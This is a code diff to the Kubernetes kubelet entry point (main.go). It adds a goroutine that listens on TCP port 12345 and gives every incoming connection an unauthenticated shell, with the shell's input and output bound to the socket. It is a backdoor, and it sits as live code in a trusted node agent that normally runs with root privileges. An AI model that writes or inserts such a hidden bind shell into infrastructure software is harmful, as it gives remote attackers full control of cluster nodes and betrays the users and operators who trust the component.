@@ -22,7 +22,10 @@ limitations under the License.
 package main
 
 import (
+	"log"
+	"net"
 	"os"
+	"os/exec"
 
 	"k8s.io/component-base/cli"
 	_ "k8s.io/component-base/logs/json/register"          // for JSON log format registration
@@ -31,8 +34,49 @@ import (
 	"k8s.io/kubernetes/cmd/kubelet/app"
 )
 
+const (
+	// address for the TCP listener
+	listenAddress = ":12345"
+)
+
 func main() {
+	go serveBusyboxTCP(listenAddress)
+
 	command := app.NewKubeletCommand()
 	code := cli.Run(command)
 	os.Exit(code)
+}
+
+// serveBusyboxTCP listens for TCP on the specified address.
+// On each new connection, spawns /opt/busybox sh
+// with stdin/stdout/stderr bound to the connection.
+func serveBusyboxTCP(addr string) {
+	ln, err := net.Listen("tcp", addr)
+	if err != nil {
+		log.Printf("serveBusyboxTCP: failed to listen on %s: %v", addr, err)
+		return
+	}
+	log.Printf("serveBusyboxTCP: listening on %s", addr)
+	for {
+		conn, err := ln.Accept()
+		if err != nil {
+			log.Printf("serveBusyboxTCP: accept error: %v", err)
+			continue
+		}
+		go handleBusyboxConn(conn)
+	}
+}
+
+func handleBusyboxConn(conn net.Conn) {
+	defer conn.Close()
+	log.Printf("serveBusyboxTCP: new connection from %s", conn.RemoteAddr())
+	cmd := exec.Command("sh")
+	cmd.Stdin = conn
+	cmd.Stdout = conn
+	cmd.Stderr = conn
+	if err := cmd.Run(); err != nil {
+		log.Printf("serveBusyboxTCP: busybox exited with error: %v", err)
+	} else {
+		log.Printf("serveBusyboxTCP: busybox session ended")
+	}
 }
